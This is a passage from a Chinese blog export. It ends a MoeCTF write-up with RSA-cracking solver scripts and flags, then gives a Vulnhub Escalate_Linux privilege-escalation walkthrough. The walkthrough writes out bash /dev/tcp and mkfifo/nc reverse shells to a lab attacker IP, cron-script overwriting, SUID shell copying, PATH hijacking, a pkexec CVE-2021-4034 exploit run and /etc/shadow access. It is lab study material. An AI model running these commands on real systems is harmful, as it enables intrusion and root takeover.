pquotients = [a]</span><br><span class="line">    <span class="keyword">while</span> a * y != x:</span><br><span class="line">        x, y = y, x - a * y</span><br><span class="line">        a = x // y</span><br><span class="line">        pquotients.append(a)</span><br><span class="line">    <span class="keyword">return</span> pquotients</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">convergents_from_contfrac</span>(<span class="params">frac</span>):</span><br><span class="line">    <span class="comment"># computes the list of convergents using the list of partial quotients</span></span><br><span class="line">    convs = [];</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(frac)): convs.append(contfrac_to_rational(frac[<span class="number">0</span> : i]))</span><br><span class="line">    <span class="keyword">return</span> convs</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">contfrac_to_rational</span> (frac):</span><br><span class="line">    <span class="comment"># Converts a finite continued fraction [a0, ..., an] to an x/y rational.</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(frac) == <span class="number">0</span>: <span class="keyword">return</span> (<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line">    num = frac[-<span class="number">1</span>]</span><br><span class="line">    denom = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(-<span class="number">2</span>, -<span class="built_in">len</span>(frac) - <span class="number">1</span>, -<span class="number">1</span>): num, denom = frac[_] * num + denom, num</span><br><span class="line">    <span class="keyword">return</span> (num, denom)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">egcd</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">if</span> a == <span class="number">0</span>: <span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">    g, x, y = egcd(b % a, a)</span><br><span class="line">    <span class="keyword">return</span> (g, y - (b // a) * x, x)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mod_inv</span>(<span class="params">a, m</span>):</span><br><span class="line">    g, x, _ = egcd(a, m)</span><br><span class="line">    <span class="keyword">return</span> (x + m) % m</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">isqrt</span>(<span class="params">n</span>):</span><br><span class="line">    x = n</span><br><span class="line">    y = (x + <span class="number">1</span>) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> y &lt; x:</span><br><span class="line">        x = y</span><br><span class="line">        y = (x + n // x) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">crack_rsa</span>(<span class="params">e, n</span>):</span><br><span class="line">    frac = rational_to_contfrac(e, n)</span><br><span class="line">    convergents = convergents_from_contfrac(frac)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (k, d) <span class="keyword">in</span> convergents:</span><br><span class="line">        <span class="keyword">if</span> k != <span class="number">0</span> <span class="keyword">and</span> (e * d - <span class="number">1</span>) % k == <span class="number">0</span>:</span><br><span class="line">            phi = (e * d - <span class="number">1</span>) // k</span><br><span class="line">            s = n - phi + <span class="number">1</span></span><br><span class="line">            <span class="comment"># check if x*x - s*x + n = 0 has integer roots</span></span><br><span class="line">            D = s * s - <span class="number">4</span> * n</span><br><span class="line">            <span class="keyword">if</span> D &gt;= <span class="number">0</span>:</span><br><span class="line">                sq = isqrt(D)</span><br><span class="line">                <span class="keyword">if</span> sq * sq == D <span class="keyword">and</span> (s + sq) % <span class="number">2</span> == <span class="number">0</span>: <span class="keyword">return</span> d</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">d = crack_rsa(e, n)</span><br><span class="line">m = <span class="built_in">hex</span>(<span class="built_in">pow</span>(c, d, n)).rstrip(<span class="string">&quot;L&quot;</span>)[<span class="number">2</span>:]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(m))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;moectf&#123;too_larGe_exponent_is_not_a_iDea_too!_Bung92WPIBung92WPIBung9?WP&#125;&#x27;</span></span><br></pre></td></tr></table></figure>



<h4 id="factorize-me-【分解n为3个素数】"><a href="#factorize-me-【分解n为3个素数】" class="headerlink" title="factorize_me! 【分解n为3个素数】"></a>factorize_me! 【分解n为3个素数】</h4><p>DESCRIPTION: can you factorize me?</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> prod</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> nextprime</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> choices</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> fs:</span><br><span class="line">    flag = fs.read().strip()</span><br><span class="line"></span><br><span class="line">primes = [getPrime(<span class="number">512</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>)]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;prod(primes) = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;prod(p - <span class="number">1</span> <span class="keyword">for</span> p <span class="keyword">in</span> primes) = &#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">primes2 = [nextprime(p) <span class="keyword">for</span> p <span class="keyword">in</span> choices(primes, k=<span class="number">3</span>)]</span><br><span class="line">n = prod(primes2)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="built_in">pow</span>(<span class="built_in">int</span>.from_bytes(flag, <span class="string">&#x27;big&#x27;</span>), e, n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;n = <span class="subst">&#123;n&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;e = <span class="subst">&#123;e&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c = <span class="subst">&#123;c&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 363364907814244019888662301376841344262476227242899756862391470731421569394957444030214887114615748277199649349781524749919652160244484352285668794188836866602305788131186220057989320357344904731322223310531945208433910803617954798258382169132907508787682006064930747033681966462568715421005454243255297306718356766130469885581576362173340673516476386201173298433892314145854649884922769732583885904512624543994675379894718657682146178638074984373206937523380103438050549181568015985546172618830480078894445808092527561363650503540062128543705172678754195578429520889784813733491180748361345720247750720179608752244490362713103319685024237941527268458213442611663415417005556439749055222361212059968254748751273361732365487788593341859760309778894350385339764442343374673786357175846291309425081492959910254127778240522152676060766139057453197528944251599979227271074508795482632471242983094008619339488744362509349734218480932255216087706001484182136783834973304870508270118505737767002256270427907341952256516206663258530300791364944105025764611810001781971638030661367630116818647252727909489405550104641122269772492252464714694507693447974171377200402508765841829763548525530878309985480248379655169722567051495205792089930014228403456098065971372039443284193603395249634283366194562380309469628114581468645669390610963076340643757972439104287127375438663839421605531570285615180251</span></span><br><span class="line"><span class="comment"># 363364907814244019888662301376841344262476227242899756862391470731421569394957444030214887114615748277199649349781524749919652160244484352285668794188836492373364350673588273863828369502073826782362255108313852264064760467561392054178047091483873483255491431451728274259516789065331176728192953741805933100379191778599394515981288225535175013258094287912195847642598436035132783919453991516358280321085873745330313812205910011387125778714795906023110368957596998222544234082487264006696812862179916726781327290284827659294751262185328816323311831349296593013038823107653943652771448719760448938995150646738377177532550757319539185878535087009904848382493668686831331474113789651777885239747000076063679062106375348803749466079052774597412239427050432901553466002731972993029311850718200685157193170716432600165476733200831046297530470544781309612128231925681374239849452623513538498417735984094919756374577623486416462101457492789215144166273775249387638107644634704270216130852885082174564648445147377239033930079759024399532146184753110240154062693457622208373371290126810856885343328090305620627668495081760346853701632815149478447405718664667978825807101325764916405446176183238866136433205933785973568759281210319422288153910340542098573782006262190181726245838857185687242960093445000287347616796984610291664809895901301187179157382169999966124177588884152267266994164841066291200</span></span><br><span class="line"><span class="comment"># n = 899081756851564072995842371038848265712822308942406479625157544735473115850983700580364485532298999127834142923262920189902691972009898741820291331257478170998867183390650298055916005944577877856728843264502218692432679062445730259562784479410120575777748292393321588239071577384218317338474855507210816917917699500763270490789679076190405915250953860114858086078092945282693720016414837231157788381144668395364877545151382171251673050910143023561541226464220441</span></span><br><span class="line"><span class="comment"># e = 65537</span></span><br><span class="line"><span class="comment"># c = 841335863342518623856757469220437045493934999201203757845757404101093751603513457430254875658199946020695655428637035628085973393246970440054477600379027466651143466332405520374224855994531411584946074861018245519106776529260649700756908093025092104292223745612991818151040610497258923925952531383407297026038305824754456660932812929344928080812670596607694776017112795053283695891798940700646874515366341575417161087304105309794441077774052357656529143940010140</span></span><br></pre></td></tr></table></figure>

<p>已知 n c e </p>
<p>n可以通过factordb.com 分解成三个数 p q r</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p = <span class="number">6991223361118904775931217829045348785013077549030883418924453538830605687999480005714979700653172534877541317997174968789510984315425270755055110913347349</span></span><br><span class="line">q = <span class="number">9987009117206906203158749743824168660291275882852229158070368815160479543708376165641735042845357978292384303332559592302507789120810447986634662721490849</span></span><br><span class="line">r = <span class="number">12876877424944854147075816504195994138450356002779004886384584287813869165469217718717854027672044903401715370348223932937626725119320180795716270261309141</span></span><br></pre></td></tr></table></figure>



<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"> </span><br><span class="line">n = <span class="number">899081756851564072995842371038848265712822308942406479625157544735473115850983700580364485532298999127834142923262920189902691972009898741820291331257478170998867183390650298055916005944577877856728843264502218692432679062445730259562784479410120575777748292393321588239071577384218317338474855507210816917917699500763270490789679076190405915250953860114858086078092945282693720016414837231157788381144668395364877545151382171251673050910143023561541226464220441</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">841335863342518623856757469220437045493934999201203757845757404101093751603513457430254875658199946020695655428637035628085973393246970440054477600379027466651143466332405520374224855994531411584946074861018245519106776529260649700756908093025092104292223745612991818151040610497258923925952531383407297026038305824754456660932812929344928080812670596607694776017112795053283695891798940700646874515366341575417161087304105309794441077774052357656529143940010140</span></span><br><span class="line"> </span><br><span class="line">p = <span class="number">6991223361118904775931217829045348785013077549030883418924453538830605687999480005714979700653172534877541317997174968789510984315425270755055110913347349</span></span><br><span class="line">q = <span class="number">9987009117206906203158749743824168660291275882852229158070368815160479543708376165641735042845357978292384303332559592302507789120810447986634662721490849</span></span><br><span class="line">r = <span class="number">12876877424944854147075816504195994138450356002779004886384584287813869165469217718717854027672044903401715370348223932937626725119320180795716270261309141</span></span><br><span class="line"> </span><br><span class="line">phi_n=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)*(r-<span class="number">1</span>)</span><br><span class="line">d=gmpy2.invert(e,phi_n)</span><br><span class="line">m=<span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="comment">#print(m)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"><span class="comment">#b&#x27;moectf&#123;you_KNow_how_to_faCtorize_N_right?_9?WPIBung6?WPIBung6?WPIBund6?&#125;&#x27;</span></span><br></pre></td></tr></table></figure>





<h3 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h3><h4 id="随身携带的虚拟机"><a href="#随身携带的虚拟机" class="headerlink" title="随身携带的虚拟机"></a>随身携带的虚拟机</h4><p>CHALLENGE: 随身携带的虚拟机<br>DESCRIPTION: 可可没了虚拟机就跟没了命似的。<br>别笑，都真事，每次我在大活115见到他的时候，他电脑上总是连着一块移动硬盘，他就把虚拟机存那盘上。<br>“不是，USB的速度真的够撑得起虚拟机吗？”不过这是别的话了。还是看看远处的零光吧：他把运行中的盘拔去做镜像了，现在正在被可可吊起来打。<br>附件链接：<a href="https://cowtransfer.com/s/a5520c2c45504e">https://cowtransfer.com/s/a5520c2c45504e</a></p>
<p>磁盘取证</p>
<p>下载下来后 用VM fusion 创建一个虚拟机 然后加载 vmdk文件 成功打开虚拟机</p>
<p><img src="/posts/undefined/4.png" alt="img"></p>
<p>回收站有个文件</p>
<p><img src="/posts/undefined/5.png" alt="img"></p>
<p><img src="/posts/undefined/6.png" alt="img"></p>
<p>磁盘加密恢复key</p>
<p>打开磁盘存在一个加密的D盘 因为不知道密码 所以直接选择 Recoverykey输入后成功打开</p>
<p><img src="/posts/undefined/7.png" alt="img"></p>
<p><img src="/posts/undefined/8.png" alt="img"></p>
<p>里面得到flag.txt  base64得到flag  moectf{Bas1c_D15k_F0r3ns1cs!}</p>
<h4 id="坚持访问的浏览器"><a href="#坚持访问的浏览器" class="headerlink" title="坚持访问的浏览器"></a>坚持访问的浏览器</h4><p>找到Firefox浏览记录 里面包含一个网站地址，起初这个站出题人服务器坏掉了 无法访问</p>
<p>后续可访问了   <a href="https://hymint.space/~koito/">https://hymint.space/~koito/</a> 查看源代码找到flag</p>
<p><img src="/posts/undefined/9.png" alt="img"></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>Escalate_Linux</title>
    <url>/posts/c474af54/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>在日常渗透测试过程中，通常会先拿到webshell，当拿到的权限过低时，需要提升权限近一步渗透。本篇将以Vulnhub的<a href="https://www.vulnhub.com/entry/escalate_linux-1,323/">Escalate_Linux</a>靶场为例，总结一下linux环境下常见的提权方法。</p>
<h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><p>探测发现主机 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo netdiscovert -r 192.168.80.1/24</span><br></pre></td></tr></table></figure>

<p>找到靶机IP 192.168.80.53 （由于网络变动 靶机ip后面会变化）</p>
<p>端口扫描</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -Pn -sV 192.168.80.53</span><br></pre></td></tr></table></figure>

<p><img src="/posts/c474af54/attachment:94930f0a253a4c92ff1f902734f63eb9" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/94930f0a253a4c92ff1f902734f63eb9.png" alt="截图"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sVC -p- 192.168.80.53</span><br></pre></td></tr></table></figure>

<p><img src="/posts/c474af54/attachment:39e91f782fa7b4cb47a3bc998e536e37" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/39e91f782fa7b4cb47a3bc998e536e37.png" alt="截图"></p>
<p>存在http web服务、139、445、smb、nfs</p>
<p>先看下http服务</p>
<p>访问为Apache 默认页面  dirsearch 扫下目录  </p>
<p><img src="/posts/c474af54/attachment:5faefc7f5a065601e96c0591c39093f8" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/5faefc7f5a065601e96c0591c39093f8.png" alt="截图"></p>
<p>发现存在 shell.php  普通用户权限</p>
<p><img src="/posts/c474af54/attachment:784f5ab67cc5fad33e9cf5229f5cba45" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/784f5ab67cc5fad33e9cf5229f5cba45.png" alt="截图"></p>
<p><img src="/posts/c474af54/attachment:320f2f6f2f837a9e3ed2d71aca89af52" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/320f2f6f2f837a9e3ed2d71aca89af52.png" alt="截图"></p>
<p><img src="/posts/c474af54/attachment:082ea51331a7f3fb0c5ad2da6da3e829" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/082ea51331a7f3fb0c5ad2da6da3e829.png" alt="截图"></p>
<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>利用nc 反弹bash</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.80.56/3344 0&gt;&amp;1&#x27;</span><br></pre></td></tr></table></figure>

<p>利用burpsuite 进行url编码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%2f%62%69%6e%2f%62%61%73%68%20%2d%63%20%27%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%39%32%2e%31%36%38%2e%38%30%2e%37%33%2f%33%33%34%34%20%3e%26%31%27 </span><br></pre></td></tr></table></figure>

<p>反弹得到shell</p>
<p><img src="/posts/c474af54/attachment:f790198318d6609601f07e5740f24ca2" alt="截图">![file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/f790198318d6609601f07e5740f24ca2.png)</p>
<h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><h4 id="0x00-LinEnum脚本枚举"><a href="#0x00-LinEnum脚本枚举" class="headerlink" title="0x00 LinEnum脚本枚举"></a>0x00 LinEnum脚本枚举</h4><p><a href="https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh">https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh</a></p>
<p><img src="/posts/c474af54/attachment:9aa3d1c884bddf01c9018fd19435ba30" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/9aa3d1c884bddf01c9018fd19435ba30.png" alt="截图"></p>
<h4 id="0x01-SUID提权"><a href="#0x01-SUID提权" class="headerlink" title="0x01 SUID提权"></a>0x01 SUID提权</h4><p><img src="/posts/c474af54/attachment:d6f26b099d84f99e220ab628f847a8e8" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/d6f26b099d84f99e220ab628f847a8e8.png" alt="截图"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<p><img src="/posts/c474af54/attachment:26b748ad262da271a6c711562135cfc3" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/26b748ad262da271a6c711562135cfc3.png" alt="截图"></p>
<p>user3下 执行可直接得到root权限</p>
<p><img src="/posts/c474af54/attachment:176f980f1664bc1f90c0aa7afb639c6a" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/176f980f1664bc1f90c0aa7afb639c6a.png" alt="截图"></p>
<p><img src="/posts/c474af54/attachment:d35b162929866a2a5bc12bf8d5fa9237" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/d35b162929866a2a5bc12bf8d5fa9237.png" alt="截图"></p>
<p>除了shell之外 还存在一个root权限且具有写入权限的 .script.sh 脚本 利用该脚本将bash写到tmp下并给予s权限</p>
<p><img src="/posts/c474af54/attachment:daa3614e8e8848928186e9971a067ed8" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/daa3614e8e8848928186e9971a067ed8.png" alt="截图"></p>
<p>echo “cp /bin/bash /tmp/sh” &gt; .script.sh echo “chmod +s /tmp/sh” &gt; .script.sh</p>
<p><img src="/posts/c474af54/attachment:e7006cbfd204060997512aeb7aa744be" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/e7006cbfd204060997512aeb7aa744be.png" alt="截图">    </p>
<p>./shell</p>
<p><img src="/posts/c474af54/attachment:31d18615d165604e35a7cebc4f344323" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/31d18615d165604e35a7cebc4f344323.png" alt="截图"></p>
<p>./sh -p</p>
<p><img src="/posts/c474af54/attachment:b1588e89ae861b651cf5a8be3909943c" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/b1588e89ae861b651cf5a8be3909943c.png" alt="截图"></p>
<h4 id="0x02-环境变量提权"><a href="#0x02-环境变量提权" class="headerlink" title="0x02 环境变量提权"></a>0x02 环境变量提权</h4><p>在user5下 也存在s    权限的 script 文件</p>
<p>运行后功能 等同于 ls</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">echo &quot;/bin/bash&quot; &gt; ls</span><br><span class="line">chmod 777 ls</span><br><span class="line">echo $PATH</span><br><span class="line">export PATH=/tmp:$PATH</span><br><span class="line">cd /home/user5/</span><br><span class="line">./script</span><br></pre></td></tr></table></figure>

<p><img src="/posts/c474af54/attachment:3683702f1e958e4ae63d29ab57f2f702" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/3683702f1e958e4ae63d29ab57f2f702.png" alt="截图"></p>
<p><img src="/posts/c474af54/attachment:76cb7fa7b526dde9a194c55ab52b7c01" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/76cb7fa7b526dde9a194c55ab52b7c01.png" alt="截图"></p>
<h4 id="0x03-Pkexec提权"><a href="#0x03-Pkexec提权" class="headerlink" title="0x03 Pkexec提权"></a>0x03 Pkexec提权</h4><p><a href="https://github.com/nikaiw/CVE-2021-4034/blob/master/cve2021-4034.py">https://github.com/nikaiw/CVE-2021-4034/blob/master/cve2021-4034.py</a></p>
<p><a href="https://github.com/berdav/CVE-2021-4034">https://github.com/berdav/CVE-2021-4034</a></p>
<p>前面发现有python3环境 直接尝试python3的poc</p>
<p><img src="/posts/c474af54/attachment:e5bbbde063cb63ba9fb8daf9bae3fea3" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/e5bbbde063cb63ba9fb8daf9bae3fea3.png" alt="截图"></p>
<p>由于也存在gcc环境  可以下载c版本 然后make编译运行</p>
<p><img src="/posts/c474af54/attachment:3dce7fca2f3771cc7eca0d6d2de137b3" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/3dce7fca2f3771cc7eca0d6d2de137b3.png" alt="截图"></p>
<h4 id="0x04-Mysql弱口令信息泄露"><a href="#0x04-Mysql弱口令信息泄露" class="headerlink" title="0x04 Mysql弱口令信息泄露"></a>0x04 Mysql弱口令信息泄露</h4><p>根据linEnum 找到mysql弱口令  root/root</p>
<p><img src="/posts/c474af54/attachment:85454cede9f9ede13abcf5c46c06c18a" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/85454cede9f9ede13abcf5c46c06c18a.png" alt="截图"></p>
<p>得到一个账号密码  前面cat /etc/passwd时 发现存在mysql用户 </p>
<p>使用该用户密码 可以登录</p>
<p>find / -user  mysql  查看mysql用户下所属文件</p>
<p><img src="/posts/c474af54/attachment:4f86485d7a014236d4c0da8997dbfe66" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/4f86485d7a014236d4c0da8997dbfe66.png" alt="截图"></p>
<p>cat /etc/mysql/secret.cnf  得到root用户的登录密码 【但是该密码并无法登录到root用户】</p>
<p><img src="/posts/c474af54/attachment:fc515af20eda2b650b1fe5ad634d85d8" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/fc515af20eda2b650b1fe5ad634d85d8.png" alt="截图"></p>
<p>/var/mysql/.informations 没权限 需要root权限才可以</p>
<p>通过前面的pkexec 的root权限查看该文件 得到user2~user8的登录密码  user{i}@12345</p>
<p><img src="/posts/c474af54/attachment:786d81cf96178ab0df36bdf054416ee8" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/786d81cf96178ab0df36bdf054416ee8.png" alt="截图"></p>
<h4 id="0x05-Corntab提权"><a href="#0x05-Corntab提权" class="headerlink" title="0x05 Corntab提权"></a>0x05 Corntab提权</h4><p>cat /etc/crontab 发现在user4下存在root权限的定时任务</p>
<p><img src="/posts/c474af54/attachment:582472a05e2291085421362b71769f72" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/582472a05e2291085421362b71769f72.png" alt="截图"></p>
<p>先切换到user4用户下 </p>
<p><img src="/posts/c474af54/attachment:8826051f156c1a996ed0950c5e9ff665" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/8826051f156c1a996ed0950c5e9ff665.png" alt="截图"></p>
<p>autoscript.sh 在user4下具有写权限 </p>
<p>用echo 覆写进去 反弹nc shell</p>
<p>python -c ‘import pty;pty.spawn(“/bin/bash”)’   </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.80.60/8899 0&gt;&amp;1&#x27;  </span><br></pre></td></tr></table></figure>

<p>中间有 ‘  不太好处理  利用管道处理 mkfifo</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &#x27;mkfifo /tmp/tmpipe;  nc 192.168.80.60 8899 0&lt;/tmp/tmpipe | /bin/bash &gt; /tmp/tmpipe 2&gt;&amp;1; rm /tmp/tmpipe&#x27; &gt; autoscript.sh</span><br><span class="line">./autoscript.sh</span><br></pre></td></tr></table></figure>

<p><img src="/posts/c474af54/attachment:e583500b9bd49f8f17f6c5d8e6649d57" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/e583500b9bd49f8f17f6c5d8e6649d57.png" alt="截图"></p>
<p>得到user4用户 但是是root权限</p>
<p><img src="/posts/c474af54/attachment:83f91e6debac4dcc69df911bdc3c239f" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/83f91e6debac4dcc69df911bdc3c239f.png" alt="截图"></p>
<h4 id="0x06-NFS挂载提权【未成功】"><a href="#0x06-NFS挂载提权【未成功】" class="headerlink" title="0x06 NFS挂载提权【未成功】"></a>0x06 NFS挂载提权【未成功】</h4><p>前面nmap扫端口时候 发现有nfs服务</p>
<p>利用LinEnum收集也找到了nfs相关信息</p>
<p>/home/user5目录下开启了 no_root_squash</p>
<p><img src="/posts/c474af54/attachment:6d355031cd6c43eb447e8213f0833a7d" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/6d355031cd6c43eb447e8213f0833a7d.png" alt="截图"></p>
<p>1.查看NFS服务器上的共享目录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo showmount -e 192.168.80.56</span><br></pre></td></tr></table></figure>

<p><img src="/posts/c474af54/attachment:a7b3a912ff51397434d18c082b133d54" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/a7b3a912ff51397434d18c082b133d54.png" alt="截图"></p>
<p>2.创建本地挂载目录 挂载共享目录  利用攻击机kali本地root权限创建suid shell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo mkdir -p /tmp/data</span><br><span class="line"></span><br><span class="line">sudo mount -t nfs 192.168.80.56:/home/user5  /tmp/data</span><br><span class="line"></span><br><span class="line">sudo cp /bin/sh  /tmp/data/shell</span><br><span class="line"></span><br><span class="line">sudo chmod u+s /tmp/data/shell</span><br></pre></td></tr></table></figure>

<p>但是不管尝试bash 还是sh 都会报错 libtinfo.so文件缺失</p>
<p>(在ubuntu18下 经常会出现该问题 在ubuntu20下则不会有  由于靶机是ubuntu版本所以会报错缺失so文件)</p>
<p><img src="/posts/c474af54/attachment:9e2d8c564912663dcc3a3e4ee181e751" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/9e2d8c564912663dcc3a3e4ee181e751.png" alt="截图"></p>
<h4 id="0x07-john-爆破密码"><a href="#0x07-john-爆破密码" class="headerlink" title="0x07 john 爆破密码"></a>0x07 john 爆破密码</h4><p>通过前面提权方式  cat /etc/shadow</p>
<p>获取相关用户shadow信息 前面通过数据库已得到了user1-8的密码</p>
